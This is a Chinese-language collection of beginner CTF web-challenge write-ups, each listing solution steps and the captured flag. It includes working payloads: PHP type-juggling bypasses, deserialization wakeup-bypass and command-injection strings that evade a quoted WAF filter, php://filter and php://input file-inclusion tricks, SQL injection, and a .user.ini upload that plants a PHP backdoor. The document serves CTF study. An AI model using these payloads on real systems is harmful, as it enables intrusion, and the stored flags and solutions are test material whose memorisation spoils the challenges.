## DifficultyOne

### baby_web

1. 提示：想想初始页面是哪个
   显然为index.php
2. 打开场景跳转到1.php
3. 将1.php改为index.php请求，还是跳转到1.php
4. F12打开网络控制台，查看返回的数据包，有两个，1.php和index.php，分别查看，发现flag在index.php的数据包里

   flag{very_baby_web}

### simple_php

源代码：

```php
﻿<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```

1. 要使三个if都成立才可以拿到完整的flag
2. 考虑到php是弱类型，第一个if可以用a='0'绕过：'0'是字符不为空，这里用的==而不是===不比较类型
3. 及要让b不是纯数字又要使b大于1234，b=6666666a绕过：is_numeric函数判断时不是纯数字，但是比较时会当作6666666比较

Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}

### weak_auth

1. 打开是一个登陆界面，结合一下做pikachu的经验，输入admin，123456
2. 成功登录

cyberpeace{e4d490f4a107131adefa4d9d5666b748}

### view_source

1. 题目告知右键被js禁用了
2. 第一种方法，F12打开开发者编辑器（我用的Edge），第二种禁用当前网站js

cyberpeace{3c4d5c10f7484be043b29a48bde3280b}

### unserialize3

源代码：

```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```

1. code传一个get参数，传一个序列化的字符串（O:4:"xctf":1:{s:4:"flag";s:3:"111";}），反序列化后调用的wakeup函数是bad request
2. 当对象属性个数的值大于真实的属性个数，wakeup不会被调用，将1改成2（O:4:"xctf":2:{s:4:"flag";s:3:"111";}）

cyberpeace{5c98760f1f2de8558c8688a98faea80a}

### Training-WWW-Robots

1. 打开是一段文字，其中有一个链接
2. 但是看到题目robots,直接访问robots.txt,这个文件是爬虫协议
3. 跳转看到一个fl0g.php
4. 访问fl0g.php

cyberpeace{71309f75d6f3a6bbe66f92414d837d96}

### PHP2

1. 试了半天没什么思路，用disearch扫描发现一个文件index.phps可以访问
2. 访问得到源码

   ```php
   <?php
   if("admin"===$_GET[id]) {
     echo("<p>not allowed!</p>");
     exit();
   }

   $_GET[id] = urldecode($_GET[id]);
   if($_GET[id] == "admin")
   {
     echo "<p>Access granted!</p>";
     echo "<p>Key: xxxxxxx </p>";
   }
   ?>

   Can you anthenticate to this website?
   ```
3. 传的参数不能等于admin，url解码后等于admin，将admin编码一下（网上的url编码器用不了，因为英文字母是可以出现在url中的， 手动将admin转16进制后在前面加%）
4. 再次访问，浏览器自动解码了，再手动编一次（将%转成25%）id=%2561%2564%256d%2569%256e

cyberpeace{3985109ec3147e0c3e5b7f12d688f9fc}

### ics-06

1. 打开靶场，点左边的超链接，唯一跳转的就报表中心
2. 输入日期，没反应，
3. 看url有一个id参数，先试试输入2，3，4没反应
4. 随便输asdh，发现又跳转到id=1，查看返回的数据包，状态码302
5. 没有sql注入，只能输入纯数字，看是否存在爆破的可能
6. 打开burpsuite,抓包send to intruder，单参数设置一个变量（sniper）,payload type设为numbers，从一到一万，到2333发现数据 包长度不一样，打开查看

cyberpeace{b6759c69c773d2b174be64b4a581c332}

### backup

1. 提示：你知道index.php备份文件的文件名吗，直接搜，是index.php.bak
2. 下载打开查看

Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}

### cookie

1. burp抓包，查看cookie，发现cookie.php
2. 访问cookie.php，看到See the http response
3. 查看返回的数据包

cyberpeace{8d76beda2b0228544e7fd6bf40d1dc23}

### disabled_button

1. 查看网页源代码，找到flag按键元素，是一个post传值，但是有disabled的属性
2. 第一种，编辑源代码，去除disabled属性，第二种，burp抓包，修改请求方式，post传参

cyberpeace{7f1cc6b89f5a554d027d68a75860db59}

### get_post

1.get传参a=1，post传参b=2

cyberpeace{a9e5e18caa5282349607b312e0551a45}

### robots

1. 直接访问robots.txt
2. 出现f1ag_1s_h3re.php，再访问

cyberpeace{85808826ddd5e1af57cef82b0d94b8d5}

### inget

1. 先随便传几个纯数字get参数，发现没用，试了一下admin，出现回显

   **I'm not allowed to tell you the admin password**

   有sql注入
2. id=admin' or 1=1--+还是相同的传不同的参数，把admin改成1，后来发现只要出现admin就会出现这个I'm not allowed to tell you the admin password

cyberpeace{8e396c911aeed387210c7acf7c0f405c}

### easyupload

1. 没有思路，看别人的writeup，知道了.user.ini这个文件是对php.ini文件的补充
2. 利用特性auto_prepend_file的特性，每个php文件都在文件头包含此文件，写一个.user.ini文件上传，
   GIF89（图片文件头绕过检测）
   auto_prepend_file=1.jpg
3. 只要检测到文件里有php就禁止上传，1.txt内写入 `<?=php后门代码?>`,利用短标签绕过，
4. 上传发现无效，怀疑是短标签设置选项没打开，再加一句short_open_tag=On,上传user.ini
5. 蚁剑连接，查看flag

cyberpeace{64f261d33744ecc2349c43f9550b823f}

### fileinclude

1. 直接访问flag.php没反应
2. 查看网页源码

```php
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
        @setcookie("language","english");
        @include("english.php");
}
else
{
        @include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
```

3. 传一个cookie参数，language=xxx，加上后缀.php被包含
4. Cookie: language=php://filter/read=convert.base64-encode/resource=flag
5. 得到PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2E1NTBhNmVjZTAzZWQyOWExN2Y5MThlMWFjMDgxYjc3fSI7DQo/Pg==
   base64解码

cyberpeace{a550a6ece03ed29a17f918e1ac081b77}

### fileclude

1. 查看网页源代码

   ```php
   <?php
   include("flag.php");
   highlight_file(__FILE__);
   if(isset($_GET["file1"]) && isset($_GET["file2"]))
   {
       $file1 = $_GET["file1"];
       $file2 = $_GET["file2"];
       if(!empty($file1) && !empty($file2))
       {
           if(file_get_contents($file2) === "hello ctf")
           {
               include($file1);
           }
       }
       else
           die("NONONO");
   }
   ```
2. file1被包含，file1=php://filter/read=convert.base64-encode/resource=flag.php

   file2="hello ctf"，可以用input绕过file2=php://input，再传post参数，hello ctf
3. 得到PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXthZTdlNDM5YzlmMDQ1NzFlZTgxOTFiMDU1M2YyMDg4Nn0

   base64解码

cyberpeace{ae7e439c9f04571ee8191b0553f20886}

### file_include

1. 看源码，get传参filename=php://filter/read=convert.base64-encode/resource=flag.php
   回显do not hack!
2. 发现只要出现base，read就do not hack!，换一个过滤器
3. convert.iconv.utf-16.utf-8,可以输出输出内容为

   㼼桰ੰ晩␨䝟呅≛楦敬慮敭崢笩ऊ瀤敲彧慭捴彨獵牥慮敭㴠✠敲畴湲瀠敲彧慭捴⡨⼢慢敳扼籥湥潣敤灼楲瑮穼楬籢畱瑯摥睼楲整牼瑯㌱牼慥 籤瑳楲杮椯Ⱒ␠䝟呅≛楦敬慮敭崢㬩㬧ऊ晩⠠癥污␨牰来浟瑡档畟敳湲浡⥥ ੻††††楤⡥搢⁯潮⁴慨正∡㬩 †素紊
4. 这个过滤器就是按utf-16编码,按utf-8解码，找一个php在线运行

```php
<?php
echo iconv('utf-8','utf-16','㼼桰ੰ昤慬㵧挧批牥数捡筥愹戱㑢攸戲㝦㐵㝥っ慥㉦㉤㥣㈸搲愸❽਻');
```

5. 得到

   ```php
    ??<?php
   $flag='cyberpeace{9a1bb48e2bf754e7c0eaf2d2c9822d8a}';
   ```

### easyphp

1. 源码：

   ```php
   <?php
   highlight_file(__FILE__);
   $key1 = 0;
   $key2 = 0;

   $a = $_GET['a'];
   $b = $_GET['b'];

   if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
      if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
         $key1 = 1;
         }else{
               die("Emmm...再想想");
         }
      }else{
      die("Emmm...");
   }

   $c=(array)json_decode(@$_GET['c']);
   if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
      if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
         $d = array_search("DGGJ", $c["n"]);
         $d === false?die("no..."):NULL;
         foreach($c["n"] as $key=>$val){
               $val==="DGGJ"?die("no......"):NULL;
         }
         $key2 = 1;
      }else{
         die("no hack");
      }
   }else{
      die("no");
   }

   if($key1 && $key2){
      include "Hgfks.php";
      echo "You're right"."\n";
      echo $flag;
   }

   ?> Emmm...
   ```
2. a 要大于600000，长度小于3，用科学计数法绕过，a=1e9
3. b写一个脚本，要传53724
4. c首先是一个数组，m>2022,且不是一个纯数字数，c['m'=>'2023a']
5. n是一个数组，有两个元素，第0个元素为数组c['m'=>'2023a','n'=>[[]]]
6. 剩下的条件，可以通过0来绕过，在搜索时，会逐个将数组中的元素与字符转比较，当0与一个字符串比较时，会先转化成0再于零比较，所以array_search这个函数的返回值为1，绕过第一处，而n中没有DGGJ自然通过第二处，c['m'=>'2023a','n'=>[[]，0]]

cyberpeace{2d6849e178c56b835a34b5e7dadd8ae1}

### unseping

> 1. 源代码
>
> ```php
>    <?php
>    highlight_file(__FILE__);
>
>    class ease{
>
>        private $method;
>        private $args;
>        function __construct($method, $args) {
>            $this->method = $method;
>            $this->args = $args;
>        }
>
>        function __destruct(){
>            if (in_array($this->method, array("ping"))) {
>                call_user_func_array(array($this, $this->method), $this->args);
>            }
>        }
>
>        function ping($ip){
>            exec($ip, $result);
>            var_dump($result);
>        }
>
>        function waf($str){
>            if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
>                return $str;
>            } else {
>                echo "don't hack";
>            }
>        }
>
>        function __wakeup(){
>            foreach($this->args as $k => $v) {
>                $this->args[$k] = $this->waf($v);
>            }
>        }
>    }
>
>    $ctf=@$_POST['ctf'];
>    @unserialize(base64_decode($ctf));
>    ?>
> ```
>
> 2. 传一个序列化对象，base64编码，反序列化的时候调用wakeup，然后调用waf，在对象销毁时调用destruct函数，call_user_func_array，第一个参数为函数名，这个函数将第二个参数作为回调函数的参数执行第一个函数，当传入的method参数为ping时才会执行类中的ping函数，传入的args参数为在ping中调用的系统命令，要注意的是，第二个参数一定是数组
> 3. 看到了waf函数中的正则表达式过滤，这里执行的是系统命令，而在linuxshell编程中，$@代表一个空变量
>    ${IFS}代表空格，构造
>
>    new ease("ping",array("l$@s"));
> 4. 得到一个目录，flag_1s_here
> 5. 了解到反单引号的作用，将反单引号中的内容执行一遍再继续执行当前命令
>
>    ease("ping",array('ca$@t${IFS}find'));   得到：
>
>    ```
>    array(42) { [0]=> string(5) " string(52) "//$cyberpeace{de5b1ceda0e73194b62ee6dc61bad117} string(25) "highlight_file(__FILE__);" [3]=> string(0) "" [4]=> string(11) "class ease{" [5]=> string(0) "" [6]=> string(20) " private $method;" [7]=> string(18) " private $args;" [8]=> string(42) " function __construct($method, $args) {" [9]=> string(32) " $this->method = $method;" [10]=> string(28) " $this->args = $args;" [11]=> string(5) " }" [12]=> string(0) "" [13]=> string(26) " function __destruct(){" [14]=> string(53) " if (in_array($this->method, array("ping"))) {" [15]=> string(75) " call_user_func_array(array($this, $this->method), $this->args);" [16]=> string(9) " }" [17]=> string(5) " }" [18]=> string(0) "" [19]=> string(23) " function ping($ip){" [20]=> string(27) " exec($ip, $result);" [21]=> string(26) " var_dump($result);" [22]=> string(5) " }" [23]=> string(0) "" [24]=> string(23) " function waf($str){" [25]=> string(87) " if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {" [26]=> string(24) " return $str;" [27]=> string(16) " } else {" [28]=> string(30) " echo "don't hack";" [29]=> string(9) " }" [30]=> string(5) " }" [31]=> string(0) "" [32]=> string(24) " function __wakeup(){" [33]=> string(42) " foreach($this->args as $k => $v) {" [34]=> string(45) " $this->args[$k] = $this->waf($v);" [35]=> string(9) " }" [36]=> string(5) " }" [37]=> string(1) "}" [38]=> string(0) "" [39]=> string(20) "$ctf=@$_POST['ctf'];" [40]=> string(34) "@unserialize(base64_decode($ctf));" [41]=> string(2) "?>" }
>    ```

    cyberpeace{de5b1ceda0e73194b62ee6dc61bad117}
